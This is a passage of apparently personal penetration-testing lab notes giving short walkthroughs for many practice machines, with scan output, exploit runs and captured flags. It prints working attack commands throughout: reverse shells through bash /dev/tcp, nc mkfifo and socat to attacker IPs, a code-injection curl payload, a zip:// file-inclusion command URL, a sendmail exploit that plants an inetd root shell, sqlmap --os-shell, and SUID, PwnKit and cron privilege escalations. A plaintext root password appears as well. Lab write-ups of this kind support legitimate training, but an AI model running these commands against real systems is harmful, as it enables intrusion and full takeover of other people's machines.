connect to [192.168.45.153] from (UNKNOWN) [192.168.223.190] 54556
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@law:/var/www$ cat local.txt
cat local.txt
a0d3e37471af4d53ec673d73d60ab000
```

3. Privilege escalation and root.txt
```
www-data@law:/var/www$ echo "chmod u+s /bin/bash" >> cleanup.sh

www-data@law:/var/www$ /bin/bash -p 
/bin/bash -p 
bash-5.1# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data

bash-5.1# cat proof.txt
cat proof.txt
cd41d64f03d2749cb1a99b4af2826ac7
```

## Marshalled




## PC
1. Rustscan 
```
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack
```

2. Nmap 
```
nmap -A -T4 -p22,8000 192.168.223.210
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 10:58 EDT
Nmap scan report for 192.168.223.210
Host is up (0.30s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
8000/tcp open  http-alt ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 173
```

3. Run linpeas. Found rpc.py file running as root
```
root         991  0.1  1.2  31980 24496 ?        S    14:54   0:01  _ python3 /opt/rpc.py
```

4. Found exploit for rpc.py. Make command changes. 
```
https://github.com/ehtec/rpcpy-exploit/blob/main/rpcpy-exploit.py

def main():
    exec_command('chmod u+s /bin/bash')
```

5. New bash SUID created. Use it for privilege escalation. Obtained proof.txt
```
user@pc:/tmp$ /usr/bin/bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
email4.txt  proof.txt  snap
bash-5.0# cat proof.txt
01fe6e650fad109bbf23a07a07413460
```



## Plum

1. Rustscan
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

2. Nmap
```
nmap -A -T4 -p22,80 192.168.223.28  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 12:01 EDT
Nmap scan report for 192.168.223.28
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: PluXml - Blog or CMS, XML powered !
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
```

3. Found admin:admin creds for port 80 webpage. 

4. Can add monkey pentest php reverse shell file codes in 'static pages>001'

5. Obtained reverse shell. Found local.txt
```
nc -lvnp 4449
listening on [any] 4449 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.223.28] 37088
Linux plum 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux
 12:08:10 up 12 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)\

www-data@plum:/var/www$ cat local.txt
cat local.txt
b4239780df3129bfdc620f5058e7b5e6
```

6. Found Root creds. Found Root.txt
```
www-data@plum:/var/mail$ cat www-data

root:6s8kaZZNaZZYBMfh2YEW

www-data@plum:/var/mail$ su root
su root
Password: 6s8kaZZNaZZYBMfh2YEW

root@plum:~# cat proof.txt
cat proof.txt
3bc3efc04a3e374016192820e2827b94
```


## Press
1. Rustscan
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
8089/tcp open  unknown syn-ack
```

2. Nmap 
```
nmap -p$(cat press-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.223.29
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 12:23 EDT
Nmap scan report for 192.168.223.29
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Lugx Gaming Shop HTML5 Template
|_http-server-header: Apache/2.4.56 (Debian)
8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: FlatPress
|_http-server-header: Apache/2.4.56 (Debian)
|_http-generator: FlatPress fp-1.2.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds
```

3. Found exploit for port 8089 port service flatpress. 
```
https://github.com/flatpressblog/flatpress/issues/152

login as admin:password credentials
```

4. Upload monkey pentest reverse shell php file. Add gif header at the beginning
```
GIF89a;
```

5. Obtaine reservse shell, run sudo -l 
```
nc -lvnp 4449
listening on [any] 4449 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.223.29] 33504
Linux debian 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux
 12:33:02 up 14 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

sudo -l
sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/apt-get
```

6. Privilege escalation and obtained root.txt
```
sudo apt-get changelog apt
!/bin/sh

# cat proof.txt
cat proof.txt
4e525ba6bcbef3ceff60fc7a94d31aa1
```

## PyLoader
1. Rustscan 
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
9666/tcp open  zoomcp  syn-ack
```

2. Nmap 
```
nmap -A -T4 -p22,9666 192.168.223.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 12:44 EDT
Nmap scan report for 192.168.223.26
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linl 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.223.26:9666/
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results amap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.34 seconds
```

3. Used pyloader default credentials 'pyload:pyload'. Tried to upload file, unsuccessful. Looked for version and it was 0.5.0, find the RCE exploit and download it. 
```
https://github.com/JacobEbben/CVE-2023-0297/blob/main/README.md
```

4. Download it and run, obtained reverse shell and root flag. 
```
python exploit.py -t http://192.168.245.26:9666 -I 192.168.45.174 -P 4449 -c id
/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[SUCCESS] Running reverse shell. Check your listener!

nc -lvnp 4449
listening on [any] 4449 ...
^[[Aconnect to [192.168.45.174] from (UNKNOWN) [192.168.245.26] 37228
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell
root@pyloader:~/.pyload/data# whoami
whoami
root
root@pyloader:~/.pyload/data# cd /root
cd /root
root@pyloader:~# ls
ls
Downloads
email5.txt
proof.txt
snap
root@pyloader:~# cat proof.txt
cat proof.txt
3b5d4c800278f91b40728ed3cb3e5932
```



## RubyDome
1. Rustscan 
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
3000/tcp open  ppp     syn-ack
```

2. Nmap 
```
nmap -A -T4 -p22,3000 192.168.245.22
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 20:36 EDT
Nmap scan report for 192.168.245.22
Host is up (0.33s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-title: RubyDome HTML to PDF
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
```

3. Looked for rubydome html to pdf exploit. Find an exploit, used it to get reverse shell. 
```
https://github.com/UNICORDev/exploit-CVE-2022-25765?tab=readme-ov-file

python3 exploit-CVE-2022-25765.py -s 192.168.45.174 4449 -w http://192.168.245.22:3000/pdf -p url

nc -lvnp 4449                       
listening on [any] 4449 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.245.22] 52812
id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
```

4. Obtained reverse shell, sudo -l, privilege escalation and obtained local.txt and root.txt
```
andrew@rubydome:~/app$ sudo -l
(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb

andrew@rubydome:~/app$ cat app.rb                                             
cat app.rb                                                                    
exec "/bin/sh"                                                                
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb             
sudo /usr/bin/ruby /home/andrew/app/app.rb                                    
# id                                                                          
id                                                                            
uid=0(root) gid=0(root) groups=0(root)

cat local.txt
28c82cfb377f1b2c68b14b660aaccf22

cat proof.txt
211dd14bfa93c1a45cb53ed09a92b9d1
```

## Zipper

All in one 
```
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.120.119 -sC -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 03:01 MST
Nmap scan report for 192.168.120.119
Host is up (0.12s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp  open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
|_http-server-header: Apache/2.4.41 (Ubuntu)
873/tcp open  rsync
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

/index.php?file=home

http://192.168.109.128/index.php?file=php://filter/convert.base64-encode/resource=index

http://192.168.109.128/uploads/upload_1627661999.zip

http://192.168.109.128/index.php?file=zip://uploads/upload_1713347794.zip%23exploit&cmd=whoami

bash -c 'bash -i >& /dev/tcp/192.168.45.202/1234 0>&1'

cat /etc/crontab

www-data@zipper:/var/www/html/uploads$ ln -s /root/secret enox.zip

www-data@zipper:/var/www/html/uploads$ touch @enox.zip

www-data@zipper:/opt/backups$ cat backup.log

ssh root@192.168.120.119  
WildCardsGoingWild 
```


## ClamAV 

1. Port scan
```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.155], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

2. Found exploit for sendmail 8.13.4. Download it and run. 
```
perl 4761.pl 192.168.206.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.206.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Wed, 8 May 2024 02:2 (No UCE/UBE) logging access from: [192.168.45.155](FAIL)-[192.168.45.155]
250-localhost.localdomain Hello [192.168.45.155], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... k
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 4486Liet004012 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

3. Got root. 
```
 nc -nv 192.168.206.42 31337 
(UNKNOWN) [192.168.206.42] 31337 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
cd root
ls
dbootstrap_settings
install-report.template
proof.txt
cat proof.txt
5ee8b3db8b48fd82c1c81ed4c8d30bd7
```

## PayDay

1. Port scan 
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: STLS SASL CAPA PIPELINING RESP-CODES UIDL TOP
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_ssl-date: 2024-05-08T02:32:54+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
|_ssl-date: 2024-05-08T02:32:54+00:00; +7s from scanner time.
|_imap-capabilities: CHILDREN SORT NAMESPACE MULTIAPPEND OK LOGINDISABLEDA0001 STARTTLS SASL-IR LITERAL+ IMAP4rev1 UNSELECT THREAD=REFERENCES Capability completed LOGIN-REFERRALS IDLE
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_imap-capabilities: SORT CHILDREN MULTIAPPEND Capability OK NAMESPACE SASL-IR LITERAL+ IMAP4rev1 UNSELECT THREAD=REFERENCES AUTH=PLAINA0001 completed LOGIN-REFERRALS IDLE
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_ssl-date: 2024-05-08T02:32:53+00:00; +6s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_ssl-date: 2024-05-08T02:32:53+00:00; +6s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found exploit for webpage. https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c (admin:admin) upload shell.phtml and open it, gives foothold. 

3. Found user name patrick. Found root:root creds but unable to login so, guess pattrik:patrick creds for ssh. Obtained root. 
```
ssh patrick@192.168.206.39 -oHostKeyAlgorithms=+ssh-dss
patrick@payday:~$ sudo -l

sudo su
root
```

## Snookums 

1. Port Scan 
```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.155
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Simple PHP Photo Gallery
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx?
```

2. Found a payload expltoit for Simple PHP Photo Gallery v0.8 which shows where to add payload. 
```
http://192.168.206.58/image.php?i=payload (http://192.168.x.x/shell.php monkey php reverse), only port 445 allowed
```

3. Obtained revese shell, find out pwnkit can root it. 
```
bash-4.2$ ./PwnKit
./PwnKit
id
uid=0(root)
```

## Pebbles
1. Port scan: 3305 vulnerable with sql
2. sqlmap gives shell with root. 
```
sqlmap http://192.168.206.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -p limit --os-shell
```
## Nibbles
1. Port scan
```
Open 192.168.206.47:21
Open 192.168.206.47:22
Open 192.168.206.47:80
Open 192.168.206.47:5437
```

2. Found exploit for postgres. PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated). Run it and obtained foothold. (only port 80 was allowed)
```
python3 50847.py -i 192.168.206.47 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.155 80 >/tmp/f' -p 5437
```

3. Rooted with find SUID. 


## Hetemit
1. Port scan
```
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
22/tcp    open  ssh          syn-ack
80/tcp    open  http         syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
18000/tcp open  biimenu      syn-ack
50000/tcp open  ibm-db2      syn-ack
```

2. Obtained foothold 
```
curl -X POST --data "code=os.system('socat TCP:192.168.45.155:18000 EXEC:sh')" http://192.168.206.117:50000/verify
```

3. Found root.service file. Use it to root. 
```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target


[cmeeks@hetemit ~]$ cat <<'EOT'> /home/cmeeks/reverse.sh
#!/bin/bash
socat TCP:192.168.118.8:18000 EXEC:sh
EOT

[cmeeks@hetemit ~]$ chmod +x /home/cmeeks/reverse.sh


[cmeeks@hetemit ~]$ sudo reboot

kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.36] 57890
python3 -c 'import pty; pty.spawn("/bin/bash")'

[root@hetemit /]# whoami
root

[root@hetemit /]#
```

## Zenphoto

1. Port scan
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
|_http-server-header: CUPS/1.4
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found /test subdirectory with zenphoto version 1.4.1.4 (source page reveal it)

3. Download and run exploit. Obtained foothold. 
```
php 18083.php 192.168.241.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

4. Rooted with linpeas which suggest [CVE-2010-3904] kernal rds exploit 
```
www-data@offsecsrv:/tmp$ gcc -pthread 15285.c -o 1
gcc -pthread 15285.c -o 1
www-data@offsecsrv:/tmp$ ./1
uid=0(firefart) gid=0(root)
```

## Nukem 
1. Port Scan 
```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
3306/tcp  open  mysql   syn-ack
5000/tcp  open  upnp    syn-ack
13000/tcp open  unknown syn-ack
36445/tcp open  unknown syn-ack
```

2. Found vulnerable plugin. (simple-file-list). Run exploit and obtained foothold. 
```
python 48979.py http://192.168.241.105/

nc -nlvp 13000
listening on [any] 13000 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.241.105] 57940
bash: cannot set terminal process group (350): Inappropriate ioctl for device
bash: no job control in this shell
[http@nukem simple-file-list]$ id
id
uid=33(http) gid=33(http) groups=33(http)
```

3. Linpeas reveal commander user creds. Logged in . 

4. Rooted with dosbox SUID. 

## Levram 
1. Port scan
```
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack
```

2. Found exploit for gerapy 0.9.7. Created new project at first. Then run. Obtained local.txt
```
python3 cve-2021-43857.py -t 192.168.241.24 -p 8000 -L 192.168.45.155 -P 445
```

3. Found python Capabilities. Use it for Privesc. 
```
app@ubuntu:~$ python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
id
uid=0(root) gid=1000(app) groups=1000(app)
```

## Mzeeav

1. Port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: MZEE-AV - Check your files
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Added MZ at beginning of shell.php (monkey rev). Obtained reverse shell. 
```
http://192.168.241.33/upload/shell.php
```

3. Rooted with /opt/fileS SUID. 
```
www-data@mzeeav:/$ /opt/fileS . -exec /bin/sh -p \; -quit
```

## Ochima
1. Port Scan 
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
8338/tcp open  unknown syn-ack
```

2. Found service maltrail v0.52 running which has exploit. Get foothold. 
```
 python3 exploit.py 192.168.45.155 80 http://192.168.241.32:8338/     
Running exploit on http://192.168.241.32:8338//login
```

3. Ran pspy64, found out the cron file. Use it to rooted. 
```
2024/05/09 04:45:01 CMD: UID=0    PID=26771  | /bin/sh -c /var/backups/etc_Backup.sh 

echo "chmod u+s /usr/bin/bash" >> etc_Backup.sh

snort@ochima:/var/backups$ bash -p
```

## Flu
1. Port Scan 
```
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack
8090/tcp open  opsmessaging syn-ack
8091/tcp open  jamlink      syn-ack
```

2. Confluence foothold. 
```
